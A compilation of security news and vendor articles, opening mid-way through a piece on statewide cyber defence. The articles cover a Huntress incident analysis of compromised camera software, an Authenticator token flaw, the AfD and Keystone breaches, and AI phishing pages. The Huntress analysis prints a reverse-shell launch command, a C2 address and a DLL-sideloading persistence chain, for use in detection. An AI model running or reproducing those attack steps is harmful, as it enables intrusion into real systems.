The model is gaining ground. The NASCIO-GDIT report found that 73% of states responding to the 2026 State CIO Survey include critical infrastructure cyber protection in their whole-of-state plans. It calls these models the main framework emerging for statewide resilience. Maturity varies widely, though. Four building blocks separate strong programs from weak ones:

Governance and clear roles. CISA’s state cybersecurity governance case studies highlight Georgia and Virginia, which use formal structures to treat cyber risk as a collective priority. They have proactively defined who is in charge of prevention, who is in charge of responding, and who is in charge of generating incident reports.

Shared visibility. You can’t prioritize what you can’t see. A statewide view of assets and exposures lets a small water district benefit from the same insight as a large state agency.

Shared services. In Utah, its federally funded shared services program offers endpoint protection, patching, training, and incident response to roughly 80% of local government entities in the state. The state secured an additional $1.5 million for water-sector cybersecurity.

Trust earned through results. What local partners need from the state is faster remediation, lower costs, and fewer surprises. New Jersey CISO Michael Geraghty made this point in the NASCIO-GDIT report: Telling local governments you’re from the state and here to help doesn’t earn their trust. Results do.

It’s also key to share information quickly. Terry Loftus, CIO of the San Diego County Office of Education and an MS-ISAC committee member, told StateScoop that many districts learn of attacks when they receive a ransomware demand.

State cybersecurity agencies should build channels that proactively push threat intelligence and exposure data to every entity in their state, to increase the chances of preventing attacks.

Five steps SLED agencies can take to boost their cyber defenses

Here’s Tenable’s advice on where to start, whether you lead a state agency, a county IT shop, a school district, or a municipal utility:

Create and continuously update a complete inventory of your critical infrastructure assets, including OT systems, remote access paths, and AI tools and apps. Start with the systems that affect public health and safety.

Prioritize by exploitability and impact. Don’t chase every finding. Focus on the exposures an attacker could realistically chain together to reach water, power, health, or emergency systems. Removing internet-exposed controllers and securing any remote access paths to them should be the highest priority.

Share visibility across jurisdictions. Give small entities access to the same insight larger agencies have, whether through statewide tooling, shared services, or regular information-sharing forums.

Govern AI use before it sprawls. Set clear policies, approved-tool lists, and training for employees who build with AI.

Check if State and Local Cybersecurity Grant Program (SLCGP) funding is still available in your state to help fund these priorities.

How Tenable can help SLED agencies

Tenable One OT Exposure capabilities extend that visibility, insight, and action to the OT and extended internet of things (xIoT) devices used by many critical infrastructure organizations.

With Tenable One, SLED teams can see what they have, understand which exposures matter most, and take prioritized actions, maximizing staff and grant dollars to drive down cyber risk.

The City of Raleigh in North Carolina, for example, uses Tenable to ensure the safety and sustainability of its public water systems. To see how Tenable supports statewide programs, explore our state, local, and education solutions and learn how Tenable helps meet SLCGP requirements.

Looking ahead

The attack surface is growing, a trend that AI is accelerating. Federal funding is shrinking, and its future is uncertain. Yet the fundamentals of resilience stay the same: know your assets, understand your exposures, share what you learn, and act together before an attacker forces your hand.

No single state or jurisdiction has solved this, and no single tool will. A whole-of-state approach gives SLED organizations the best chance to stay ahead of the threats facing the critical services residents rely on every day.

Title: Camera Management Software Compromise Leads to Malware Deployment
Context: The Attack Once the threat actor had compromised the camera management software, they added a file named rs
Full Text:
Acknowledgements: Special thanks to John Hammond, Ethan Williams, and Dray Agha for their contributions to this investigation and writeup.

Background

Security teams often focus on the software they know attackers target. But security weaknesses can exist in any software that touches an organization's environment, including tools that may not be viewed as part of the "traditional" attack surface. We recently saw a number of incidents where attackers were targeting less-scrutinized tools—camera management platforms—as a way to access the broader environment.

In September and October, Huntress observed a handful of incidents originating from camera management software (CMS.exe). Further investigation led us to assess that across all cases, a threat actor had compromised a legitimate camera management system as their initial access vector.

From there, the attack chain was loosely consistent across the multiple incidents: post-compromise, attackers would drop a file (rs.win32.exe) on the endpoint before performing DLL sideloading (via the legitimate Windows binary WpcMon.exe) in the user's AppData folder path. These would then run a beacon to 144.172.116[.]37.

Initial Access

Huntress analysts recently observed a campaign across multiple customer environments that led back to the compromise of camera management software, as seen in the process below.

C:\Program Files (x86)\CMS\CMS.exe

Huntress analysts were unable to determine the full name or creator/vendor of the software, as the file did not contain an embedded File Version Information section. However, we did find that the executable contained the following notable strings:

developerslavery

d3e3v4e3l9o9p0e3r4s2l9a1v4e3r4y6

hxxp://cloudapi.3r-dataware[.]com/sso/

The domain name 3r-dataware[.]com (pointing to a Korean company called 3R Global) may provide some insight into the source of the software. Figure 1 illustrates an excerpt of the Details page from a VirusTotal search for the domain name.

Figure 1: Whois results/VirusTotal search for 3r-dataware[.]com

Figure 2 illustrates the software download page at the kvision[.]ai website, pointing to a package named "CMS".

Figure 2: Kvision[.]ai software download page

Upon closer inspection of the CMS file downloadable from Kvision[.]ai's website, both contain the same developerslavery and d3e3v4e3l9o9p0e3r4s2l9a1v4e3r4y6 strings outlined above, as well as the 3r-dataware.com web address.

While the CMS package is listed on the software download page, we can't definitively say that the files were downloaded from this website: The connection between CMS.exe found on customer endpoints and the kvision[.]ai website is presented here as a possible source only, and not as a definitive statement of a vendor relationship.

Figure 3 illustrates network connections associated with CMS.exe.

Figure 3: Network connections linked to CMS.exe

Not only were Huntress analysts unable to definitively determine the exact name of the vendor who may have created the software from the contents of the executable file itself, but we were also unable to locate logs associated with the application. While this limited our visibility into how exactly threat actors were compromising this camera management software, we could see what they were doing in victim environments afterwards.

The Attack

Once the threat actor had compromised the camera management software, they added a file named rs.win32.exe to the endpoint. While the camera management software is located in the C:\Program Files (x86) folder, rs.win32.exe got dropped in the following folder:

C:\Users\<user>\AppData\Roaming\CMS\RemoteSetup\

The file was launched via the following command line:

rs.win32.exe -i "<IP Address>" -p "8000" -c <file> -r <file> "admin" "1234567a7654321"

This command line supplied a remote IP address and port (-p "8000"), included an admin username value for authenticating a remote-control session, and ran from the user-writable AppData\Roaming\CMS\RemoteSetup path (rather than a protected application directory). This led us to see this as a reverse shell.

From there, the threat actor then dropped the legitimate Microsoft file WpcMon.exe in the following folder:

C:\Users\<user>\AppData\Local\Microsoft\WpcMon\

Based on the SHA256 hash for this file, we could verify that WpcMon.exe is the legitimate Microsoft Windows Parental Control Monitor file, used for parental-control and activity-monitoring features. However, in this incident it stands out because the folder it is dropped in (AppData) is not the folder where we normally expect to see this file (i.e., C:\Windows\system32). This red flag revealed that threat actors were abusing this legitimate file for their attack.

The file was dropped into this location so that it could be used for DLL sideloading the intended malware, where an attacker places a malicious DLL beside a legitimate application so the application loads it and runs the attacker's code. In these incidents, the malicious DLLs in question were IPHLPAPI.DLL and samcli.dll, both of which appeared to be legitimate zlib compression libraries. However, they had been modified to incorporate beaconing functionality, periodically contacting an external command-and-control (C2) server.

Part of the infection process also included creating persistence by adding a reference to the newly installed WpcMon.exe in a value beneath the user's Run key, as shown in Figure 4. Threat actors typically add a program path to a user's Run registry key so Windows automatically launches their payload whenever that user signs in.

Figure 4: Persistence "foothold" signal

Figure 5 illustrates the process tree leading to the detection of WpcMon.exe running on the endpoint for the first time and spawning from rs.win32.exe and CMS.exe.

Figure 5: Process tree

In all incidents, the C2 IP address observed on impacted endpoints was 144.172.116[.]37, which is shown in Figure 6.

Figure 6: Active network connection

Caught on camera: Find your blind spots

What's clear from this series of incidents is that they are all stemming from a weakness in a camera management software. After using this software for initial access, attackers hid malicious DLLs behind a legitimate Windows binary and established beaconing to a C2.

Defenders should treat cameras and their management platforms as potential entry points into their broader environment: businesses should inventory the software, restrict its access, and monitor for unusual processes and outbound connections.

Where practical, organizations should also use application control to prevent unapproved executables and DLLs from running in user-writable paths, and investigate the sequence of CMS.exe, rs.win32.exe, abnormal WpcMon.exe, and unapproved outbound connections.

Title: Microsoft Authenticator Flaw Let Permissionless Android Apps Steal Work Account Tokens
Context: 11 Real Stories: How Identity Exposure Unlocks Active Attack Paths Map cross-domain privilege escalation to sever breach routes at key choke points
Full Text:
Microsoft has fixed a flaw in its Authenticator app for Android that let a malicious app with no permissions pose as a trusted Microsoft app, such as Teams, and collect sign-in tokens for a victim's work account.

Microsoft tracks the flaw as CVE-2026-80097 and fixed it in Authenticator for Android version 6.2606.4246, so anyone using the app should update.

In the researchers' tests, the tokens gave full access to the account's email, files, and calendar. Microsoft says exploitation also needs the victim to complete a sign-in step in Authenticator, and that the flaw has not been used in attacks.

The research comes from Ofek Levin, working through a fellowship program at the security firm Enclave, which published the technical details on October 23, 2026. Microsoft assigned the CVE on September 8 and rated it 8.6 on the CVSS scale, which it labels "Important."

On Android, Authenticator does more than show six-digit codes. It also acts as a broker: when Teams, Outlook, or another Microsoft app needs to sign a user in, it asks Authenticator, and Authenticator hands back a token, a digital pass that proves the user is logged in. Because the broker controls access to the entire account, it should be careful about which app it grants a token to.

The flaw let the wrong app get one. Authenticator exposes a component, an activity named AccountChooserActivity, that any app on the device can start. When the attacker's app started it, Authenticator built its token request from values the attacker's app supplied, including the name of the app it claimed to be. The app said it was Teams, and the broker believed it.

A signature check was supposed to stop this, but it did not. The check looked up the real signature of the app being impersonated and confirmed the request matched it. Because Teams was genuinely installed on the device, its real signature was there to read, so the check passed.

Authenticator could also see which app had actually made the request, Enclave found, but it did not use that to decide whether to hand over a token.

In Enclave's tests, posing as Teams and requesting Microsoft Graph tokens returned permissions to read and send mail, read and write files, and read and write calendars, among others.

Microsoft describes the result more generally: a successful attacker could authenticate as the signed-in user and reach that user's resources. The tokens apply to the work account signed into Authenticator on that device, not to other accounts.

The two accounts disagree on one point a reader should weigh. Enclave reported that its proof of concept returned tokens without any user interaction, other than the presence of a signed-in account.

Microsoft's advisory says exploitation requires installing a malicious app on the device and convincing the user to complete an authentication flow in Authenticator. Its CVSS score also indicates that the flaw requires user interaction.

Microsoft says the flaw has not been exploited and was not publicly disclosed before the fix, and rates exploitation as "less likely." It was part of the company's September 2026 Patch Tuesday and was not one of the two Windows flaws flagged that month as already under attack. The vulnerability is not listed in the U.S. CISA Known Exploited Vulnerabilities catalog as of October 26, 2026.

The fix is to update Microsoft Authenticator for Android to version 6.2606.4246 or later, as linked in Microsoft's advisory. Organizations that manage Android devices can require that minimum version through their device management. Microsoft's advisory gives the fix but does not say whether updating cancels any token a malicious app may already have obtained, so that remains unclear from the available sources.

Title: The Confidence Gap in Application Access Governance | Report
Context: Sixty-eight percent of organizations say more critical applications are in scope for access governance or SOX compliance than two years ago, and 60% say the number of critical...
Full Text:
What you will learn

Why 95% of leaders feel audit-ready while 26% see the same access findings return, how AI agents that act inside critical business applications add risk and which controls to examine first to close gaps for good.

Business application estates are growing, creating more places for risk to hide. Sixty-eight percent of organizations say more critical applications are in scope for access governance or SOX compliance than two years ago, and 60% say the number of critical applications in use but outside that scope has also increased.

Those out-of-scope applications expose the organization to unmanaged risk.

As a number of critical line-of-business applications increase for companies, application access governance (AAG) must keep pace with more users, permissions and connections between systems. Finance, IT, audit and compliance leaders need to analyze access risk across a growing number of ERP, CRM, and HCM applications, and demonstrate that controls remain effective as people change roles and AI tools and AI agents become part of critical business processes.

In Delinea’s 2026 Application Access Governance Report, finance and finance technology leaders reported confidence that their access controls would hold up to an audit. The findings tell a different story.

High confidence in access controls, yet audit findings persist

When surveyed, 95% of respondents say they are confident their access controls for business applications would withstand external audit scrutiny today. Yet 26% say the same or similar access findings have recurred in consecutive years, and 25% say findings have remained open for three or more years.

Strengthening application access governance takes time and resources. The growth in scope of business applications is translating into heavier workloads for teams responsible for governance. Sixty-eight percent of respondents reported greater effort to complete user access reviews (UARs) and 58% reported longer remediation times for access-related audit findings.

That additional work resulted in substantial expenditures to remediate risk. In the US, 46% of respondents spent $251,000 or more in the past 12 months remediating access-related audit findings. In the UK, 42% spent £201,000 or more.

What to examine: Are the same access-related findings recurring year after year, and can you show why prior remediation didn’t hold? What would it take to close an audit finding permanently rather than reopening it at the next audit?

AI adoption is outpacing oversight in business applications

Of organizations surveyed, 88% reported they already use AI tools or AI agents within critical business applications.

What is more surprising, 35% of respondents said they have deployed AI agents that perform actions that go beyond read-only analysis and recommendations. That distinction matters when it comes to critical business processes like payroll and procurement. An AI agent that can execute a transaction, change a record or alter permissions needs extra guardrails around what access it holds and which decisions require human approval.

Oversight hasn’t kept up. Fewer than half of organizations using AI in critical business applications have full, centrally tracked visibility into AI agent deployment, access, permissions, ownership and approval. Fewer than half consistently apply common governance controls across all their AI tools and agents.

This gap is causing observable problems. Eighty-four percent of organizations using AI in critical applications report at least one in the past year. Respondents reported the following AI-related issues, in order of prevalence:

What to examine: Which AI agent actions require approval, which permissions are restricted, is each action authorized and can every consequential action be traced to an accountable owner?

Excess privileged access goes unchecked

As organizations expand their portfolio of business applications, and adopt AI agents within business applications, foundational access controls become even more important. Yet the survey found that 52% of respondents do not continuously monitor and remediate excess access.

Automation helps teams make access risk management continuous, and it is becoming common across access governance activities. Access controls like segregation of duties (SoD) risk analysis and UARs have been around for quite some time, yet for many organizations manual work remains part of the control equation. When asked to what extent common access governance activities were automated, nearly two-thirds of respondents said each activity was mostly or fully automated. Only about one-quarter reported full automation.

Manual work leaves the door open for risk to show up in everyday operations. 91% of respondents reported at least one access-related condition. Respondents reported the following access-related issues, in order of prevalence:

What to examine: Do role changes, departures and emergency-access expiry reliably trigger access removal? Can you demonstrate that rejected or unnecessary access was removed, including when an audit has already identified it?

Title: Attack on email hosting provider for German far right party AfD exposed 345k accounts
Context: Have I Been Pwned confirmed the scale of the breach for the first time today, after AfD officially disclosed the September attack on its hosting provider last week
Full Text: The cyberattack on Alternative for Germany (AfD), the country’s most prominent far-right political party, exposed hundreds of thousands of confidential emails and attachments, as well as more than 345,000 unique email addresses. Have I Been Pwned confirmed the scale of the breach for the first time today, after AfD officially disclosed the September attack on its hosting provider last week. AfD said in its statement that “only a few email accounts were illegally copied,” but admitted a large amount of the data was taken from them, resulting in an extensive data breach. The emails were added to what the party described as “an activist website,” which summarised the email chains into searchable topics and has led to the publication of various revelations, such as a party co-leader’s opinions on colleagues’ “deeply problematic” racial discourse. Per a report from investigative journalist Lilith Wittmann, citing conversations with the cybercriminals responsible for the hack-and-leak job and party sources, the attack was first spotted on September 9 and started with a compromise of a poorly protected WordPress site. The same report claimed the criminals gained persistent access to the servers operated by the hosting provider, identified as AfD-owned Alternita Dienstleistungs GmbH, and exfiltrated more than a terabyte of data. No official sources have verified the hackers’ claims about how the attack unfolded. The Register contacted Alternita Dienstleistungs for its take. AfD said the owners of the affected email accounts have been notified, and that it reported the attack to security authorities. “We are deeply concerned by what has happened,” the party said in an October 20 statement. “Such a digital attack is illegal and a criminal offense. Furthermore, it is an attack on the German party system and thus on democracy. “We are extremely worried that, apparently, the content of the stolen documents was analyzed using a very rudimentary AI. This analysis focused on keywords, not the context. The alleged scandals published so far do not stand up to scrutiny – a fact that, thankfully, is being confirmed by a growing number of commentators on social media.” Among the AI-generated summaries compiled by the “activist site” are chains supposedly expressing views related to Holocaust denial, racist and antisemitic rants, the 9/11 disaster, forged documents, and more. Der Spiegel sifted through the raw files and reported that party leader Alice Weidel seemingly knew about illegal donations related to the 2017 federal elections weeks before she previously said she did. The AfD's position is that the AI summaries of the emails are not to be trusted, but it has not specifically commented on the veracity of the raw email files available for download via torrent. It did not immediately respond to our request for input, but has told reporters previously that it will not comment on whether the emails, or the stories that have been written based on them, are to be trusted. ®

Title: Keystone to Destroy 18,835 Hardware Wallets After Hackers Steal Device Verification Key
Context: 11 Real Stories: How Identity Exposure Unlocks Active Attack Paths Map cross-domain privilege escalation to sever breach routes at key choke points
Full Text:
An attacker who gained access to Keystone's website obtained the key that its hardware wallets use to prove they are genuine, the company said in a statement on October 26.

Someone with that key could build counterfeit devices that pass the online check owners use to verify a Keystone. A buyer who trusted a counterfeit could have their crypto stolen, but the incident did not involve owners' recovery phrases or wallet private keys.

Keystone will destroy 18,835 unsold devices that carry the key, and all new devices will get a new one.

Keystone found the unauthorized access on October 20, and its advice to owners depends on when a device arrived. For a device received after that date with the old key, the company said: "Even if such a device passes authentication, we cannot completely rule out the possibility that it is counterfeit."

Owners of such a device should contact Keystone support and use it only after the company confirms it is genuine.

A device delivered before October 20 that passes the check can be considered genuine and used normally, according to Keystone. The company has not said when the attacker first got in.

The attacker exploited a vulnerability in a third-party data monitoring tool used by Keystone's website to escalate privileges, according to the company. That let the attacker obtain customer data and the key.

Keystone blocked the attacker's access on October 20 and has since fixed the vulnerability. It has not said where the key was stored.

How the Device Check Works

The owner scans a QR code on Keystone's verification page with the device, then enters the code the device displays on the page.

In Keystone's open-source firmware, the QR code carries that code in encrypted form, and the device decrypts it with its stored key. So a correct code shows that the device holds the key.

The key is used only for this check. It plays no part in creating recovery phrases, deriving private keys, or signing transactions.

Anyone with a copy of the key could produce the right codes, so a counterfeit device carrying it could pass the check. Such devices could be sold or shipped to customers, leading to the theft of their crypto, Keystone said. The company has not reported any counterfeit devices or thefts.

The key is written into each device during manufacturing and cannot be erased or rewritten. The firmware keeps it in memory, which can be written only once, and refuses to accept a second key. So devices already made cannot be switched to the new key.

Customer Records

Keystone first disclosed the breach on October 24, saying a third party had obtained customers' shipping information.

The incident affected 25,964 buyer records from purchases on Keystone's website between 2024 and 2026, the company said on October 26. The records hold names, contact details, shipping addresses, and order details. Keystone's online store runs on Shopify, which stored and managed the records.

Payment card and bank details and government ID numbers were not involved, Keystone said. Purchase records from Amazon and Keystone's other sales channels were not affected.

Keystone has also included 12,873 unpaid checkout records in its response as a precaution. These hold names, contact details, and shipping information from purchases that were never completed.

Some of the affected data should already have been deleted. Keystone had promised to delete shipping information 180 days after each order.

An automated tool Keystone built to erase records in bulk did not work reliably. Some deletions failed, and Keystone did not catch the failures in time.

Keystone is shortening the period it retains customers' personal data from 180 days to 90 days, effective immediately. It has asked Shopify to delete buyers' personal data older than 90 days and expects that to be done on November 3. As of October 27, its privacy policy still listed 180 days.

Keystone is emailing affected customers and plans a page where people can check whether their information was affected.

What Keystone Owners Should Do

Keystone's guidance covers these situations:

Delivered before October 20: A device that passes the check can be used normally.

Received after October 20 with the old key: Do not use the device until Keystone support, at support@keyst.one, confirms it is genuine. Keystone told these owners to follow instructions on its device verification page, but the page showed no such instructions as of October 27. Keystone has not said how to tell which key a device carries, or what owners who have already sent crypto to such a device should do.

Waiting on an order from Keystone's website: Shipping is paused until devices with the new key are ready. As of October 27, the store listed the Keystone 3 Pro as a pre-order expected to ship within 4 to 6 weeks.

Bought through Amazon or a reseller: The same guidance applies, because it is based on when a device arrived, not where it was bought. Keystone sells through Amazon official stores and authorized resellers. Keystone has not said whether devices with the old key are still on sale there.

Already holding crypto with a Keystone: Owners do not need to move their crypto just because of the incident, Keystone said. Those with a device received after October 20 with the old key should still follow the steps above.

Scam messages: Treat any call, text, email, or letter offering a refund, a replacement device, a recall, wallet verification, or help moving crypto as a scam. Keystone will not ask anyone to return a device. Never enter a recovery phrase into a device you did not order, and type keyst.one into your browser instead of following links.

Title: AI-Generated Fake Login Pages Are Making Account Takeovers Easier
Context: 11 Real Stories: How Identity Exposure Unlocks Active Attack Paths Map cross-domain privilege escalation to sever breach routes at key choke points
Full Text:
Fake login pages are nothing new, but generative AI is making them easier to build and more convincing. Attackers can recreate familiar login screens, impersonate trusted brands and tailor phishing attempts to specific employees or organizations.

Some fake login pages go beyond stealing passwords. They can also capture MFA codes or hijack authenticated sessions, allowing attackers to gain access to corporate accounts even when additional security measures are in place.

How AI is making fake login pages more convincing

Attackers have long used fake login pages to steal credentials, but generative AI makes it easier to create convincing replicas of legitimate authentication portals. From company logos and page layouts to login prompts, these fraudulent pages can closely resemble the websites employees regularly access.

AI also makes it easier to tailor phishing campaigns to specific organizations or employees. For example, attackers can create personalized IT notifications that direct employees to a fraudulent login page using the company's branding and familiar authentication prompts.

These attacks often rely on lookalike domains that closely resemble legitimate web addresses, with subtle spelling changes or additional characters. Combined with realistic login pages and targeted messaging, these tactics make phishing attempts harder to recognize.

While these techniques aren't new, generative AI lets attackers create, customize and adapt phishing campaigns more quickly and at a larger scale. The 2026 Verizon Data Breach Investigations Report found that phishing accounted for 44% of the AI-assisted initial-access techniques examined.

How fake login pages lead to account takeovers

Fake login pages can capture more than usernames and passwords. Some replicate multi-step authentication processes to collect MFA codes, which attackers can attempt to use before they expire to gain unauthorized access to corporate accounts and applications.

More sophisticated attacks use Adversary-in-the-Middle (AiTM) techniques to intercept authentication sessions. In these attacks, a fraudulent website acts as a proxy between the user and the legitimate service, relaying authentication requests in real time. After the user successfully authenticates, the attacker may capture a session cookie or authentication token and use it to access the account without completing another MFA challenge.

This makes session hijacking particularly dangerous. Even with MFA enabled, attackers can potentially access accounts by stealing active session tokens. This lets them hijack an authenticated session without entering a password or completing another MFA challenge.

Why traditional phishing defenses aren't always enough

Security awareness training helps employees recognize phishing attempts, but convincing login page replicas can be difficult to distinguish from legitimate websites. Even experienced users can overlook subtle warning signs, particularly when a fraudulent page uses familiar branding and authentication prompts.

Email filters, URL blocklists and website reputation services can stop many known phishing threats, but newly registered domains and short-lived phishing sites may evade detection. Attackers also distribute malicious links through text messages, collaboration platforms and search ads, letting phishing attempts bypass email-based defenses.

URL inspection provides another layer of protection, but lookalike domains can be difficult to identify. A valid HTTPS connection also doesn't guarantee that a website is legitimate.

These gaps highlight the need for security controls that can evaluate suspicious websites and detect potential credential-harvesting attempts before users enter their login information.

How organizations can protect against credential theft

Organizations can reduce the risk of credential theft by strengthening authentication, detecting suspicious login pages and limiting what attackers can access if an account is compromised.

Use phishing-resistant MFA and passkeys: FIDO2 security keys and passkeys use cryptographic authentication tied to legitimate website domains, reducing the risk of credential theft through fraudulent login pages.

Implement browser-level phishing protection: Browser-based security tools can detect look-alike domains, brand impersonation and suspicious URL patterns. AI-powered detection can help identify credential-harvesting sites and warn users before they enter sensitive information.

Monitor authentication and session activity: Unusual sign-in locations, unfamiliar devices and suspicious session behavior can indicate account compromise. Continuous monitoring helps security teams identify and respond to potential account takeovers.

Limit privileged access: Enforcing least-privilege policies and removing unnecessary standing privileges limits what attackers can access through compromised accounts. Just-in-time access further reduces the window of opportunity for abusing elevated permissions.

Establish phishing response procedures: Organizations should have clear processes for reporting suspected phishing attempts, revoking compromised sessions, resetting credentials and investigating unauthorized access.

Protecting credentials before they're exposed

Phishing protection needs to extend beyond email filters and traditional detection methods to the point where users enter their credentials.

Keeper's AI-powered Phishing Protection uses on-device AI to identify suspicious websites, including look-alike domains and spoofed login pages, warning users before they enter their credentials.

By identifying suspicious websites earlier, organizations can reduce opportunities for credential harvesting and prevent stolen credentials from leading to account takeovers.
